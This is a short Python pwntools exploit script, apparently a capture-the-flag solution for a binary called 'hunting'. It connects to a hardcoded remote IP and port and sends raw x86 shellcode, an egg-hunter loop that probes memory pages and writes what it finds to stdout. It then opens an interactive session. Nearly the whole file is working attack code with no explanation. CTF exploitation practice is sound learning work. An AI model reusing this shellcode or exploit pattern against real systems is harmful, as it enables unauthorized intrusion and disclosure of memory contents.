from pwn import *
from icecream import ic

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

elf = ELF('hunting', checksec=False)

LOCAL = False

if LOCAL:
    io = gdb.debug(elf.path, aslr=False, gdbscript='\n'.join([
        'b *0x56556391',
        'b *0x5655644d',
        'b *0x5655643a',
        # 'b *0x56556259'
        'c',
    ])) # type: tube
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else: 
    # io = process('hunting')
    io = remote('142.93.32.153', 31993)


# stack_addr = 0xffffcec4

shellcode = bytes([
    0xbb, 0x00, 0xf0, 0xff, 0x5f, 0x81, 0xc3, 0x00, 0x10, 0x00, 0x00, 0xb8, 0xdb, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0xcd, 0x80, 0x83, 0xf8, 0x00, 0x75, 0xe4, 0x83, 0xec, 0x08, 0x89, 0xd9, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xbb, 0x01, 0x00, 0x00, 0x00, 0xba, 0x25, 0x00, 0x00, 0x00, 0xcd, 0x80
])

ic(len(shellcode))

payload = shellcode

io.sendline(payload)


io.interactive()